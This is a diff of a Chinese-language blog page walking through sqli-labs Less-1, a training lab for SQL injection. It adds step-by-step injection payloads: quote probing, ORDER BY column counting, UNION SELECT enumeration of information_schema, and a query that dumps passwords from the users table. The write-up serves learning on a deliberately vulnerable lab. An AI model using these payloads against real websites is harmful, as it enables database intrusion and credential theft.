@@ -20,19 +20,23 @@ ga('send', 'pageview');
   
   <title>sqli-labs | FINSENTY54</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="less 1 single 单个的quote 引号变量前面加 ?  在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;; 表示换行   输入 ?id=1&amp;#39;  and 1=1 --+ 没有报错，返回正确结果输入 ?id=10&amp;#39; 报错 You have an error in your SQL">
+  <meta name="description" content="less 1 single 单个的quote 引号变量前面加 ?  在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;; 表示换行    ?id=1&amp;#39;  and 1=1 --+ 没有报错，返回正确结果 ?id=10&amp;#39; 报错 You have an error in your SQL syn">
 <meta name="keywords" content="sql">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqli-labs">
 <meta property="og:url" content="http://finsenty54.github.io/2019/02/27/sqli-labs/index.html">
 <meta property="og:site_name" content="FINSENTY54">
-<meta property="og:description" content="less 1 single 单个的quote 引号变量前面加 ?  在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;; 表示换行   输入 ?id=1&amp;#39;  and 1=1 --+ 没有报错，返回正确结果输入 ?id=10&amp;#39; 报错 You have an error in your SQL">
+<meta property="og:description" content="less 1 single 单个的quote 引号变量前面加 ?  在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;; 表示换行    ?id=1&amp;#39;  and 1=1 --+ 没有报错，返回正确结果 ?id=10&amp;#39; 报错 You have an error in your SQL syn">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://s2.ax1x.com/2019/02/28/k7xiTg.png">
-<meta property="og:updated_time" content="2019-02-28T11:26:40.462Z">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/28/k7zDbT.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/28/kHSWFg.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/28/kHp8hQ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/28/kHpan0.png">
+<meta property="og:updated_time" content="2019-02-28T12:28:53.644Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs">
-<meta name="twitter:description" content="less 1 single 单个的quote 引号变量前面加 ?  在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;; 表示换行   输入 ?id=1&amp;#39;  and 1=1 --+ 没有报错，返回正确结果输入 ?id=10&amp;#39; 报错 You have an error in your SQL">
+<meta name="twitter:description" content="less 1 single 单个的quote 引号变量前面加 ?  在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;; 表示换行    ?id=1&amp;#39;  and 1=1 --+ 没有报错，返回正确结果 ?id=10&amp;#39; 报错 You have an error in your SQL syn">
 <meta name="twitter:image" content="https://s2.ax1x.com/2019/02/28/k7xiTg.png">
 <meta name="twitter:creator" content="@fin12138">
   
@@ -113,13 +117,27 @@ ga('send', 'pageview');
 <p>在Less-1里的index.php中添加 <code>echo $sql;</code> 可在网页中显示查询代码，<code>echo &quot;&lt;br&gt;&quot;;</code> 表示换行</p>
 <hr>
 <ol>
-<li>输入 <code>?id=1&#39;  and 1=1 --+</code> 没有报错，返回正确结果<br>输入 <code>?id=10&#39;</code> 报错 <code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;10&#39;&#39; LIMIT 0,1&#39; at line 1</code><br>输入<code>?id=1&#39; and a=2 --+</code> 没有正确结果<br>经过这三个步骤说明是字符型注入</li>
-<li>使用order by来判断有几个字段<br>输入<code>?id=1&#39; order by 4--+</code> 报错 <code>Unknown column &#39;4&#39; in &#39;order clause&#39;</code><br>说明有3个字段</li>
-<li><p><code>LIMIT 0,1</code> 表示结果只显示一行<br>输入<code>?id=-1&#39; union select 1,2,3 --+</code> 看哪个字段可以回显<br><a href="https://imgchr.com/i/k7xiTg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/k7xiTg.png" alt="k7xiTg.png"></a></p>
+<li><ul>
+<li><code>?id=1&#39;  and 1=1 --+</code> 没有报错，返回正确结果</li>
+<li><code>?id=10&#39;</code> 报错 <code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;10&#39;&#39; LIMIT 0,1&#39; at line 1</code></li>
+<li><code>?id=1&#39; and a=2 --+</code> 没有正确结果<br>经过这三个步骤说明是字符型注入</li>
+</ul>
 </li>
-<li></li>
+<li><p>使用order by来判断有几个字段<br><code>?id=1&#39; order by 4--+</code><br>报错<code>Unknown column &#39;4&#39; in &#39;order clause&#39;</code><br>说明有3个字段</p>
+</li>
+<li><p><code>LIMIT 0,1</code> 表示结果只显示一行<br><code>?id=-1&#39; union select 1,2,3 --+</code> 看哪个字段可以回显<br><a href="https://imgchr.com/i/k7xiTg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/k7xiTg.png" alt="k7xiTg.png"></a></p>
+</li>
+<li><p><code>?id=1&#39; union select 1,concat_ws(&#39;_&#39;,version(),user(),database()),@@basedir --+</code><br>得到版本，用户，当前数据库，数据路径<br><a href="https://imgchr.com/i/k7zDbT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/k7zDbT.png" alt="k7zDbT.png"></a><br><em>concat_ws 带分隔符的链接</em></p>
+</li>
+<li><p><code>?id=-1&#39; union select 1, group_concat(table_name),3 from information_schema.tables where table_schema = database() --+</code><br>得到当前库的表名<br><a href="https://imgchr.com/i/kHSWFg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHSWFg.png" alt="kHSWFg.png"></a><br><code>?id=-1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata) ,3 --+</code><br>查看数据库名信息<br>*group_concat 行转列</p>
+</li>
+<li><p><code>?id=-1 &#39; union select 1, (select group_concat(column_name)  from information_schema.columns where table_name=&quot;users&quot;), 3 --+</code><br>users 表的列名<br><a href="https://imgchr.com/i/kHp8hQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHp8hQ.png" alt="kHp8hQ.png"></a></p>
+</li>
+<li><p><code>?id=-1 &#39; union select 1,(select group_concat(password) from users) ,3 --+</code><br>得出账户密码<br><a href="https://imgchr.com/i/kHpan0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHpan0.png" alt="kHpan0.png"></a></p>
+</li>
 </ol>
 <hr>
+<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><hr>
 
       
     </div>
@@ -127,7 +145,7 @@ ga('send', 'pageview');
     <span id="busuanzi_container_page_pv">
   本文总阅读量<span id="busuanzi_value_page_pv"></span>次
 	</span>
-      <a data-url="http://finsenty54.github.io/2019/02/27/sqli-labs/" data-id="cjsojp0gy0001i0w8sf6kofsx" class="article-share-link">Share</a>
+      <a data-url="http://finsenty54.github.io/2019/02/27/sqli-labs/" data-id="cjsolvgot0001ysw8k00zbhc9" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/">sql</a></li></ul>
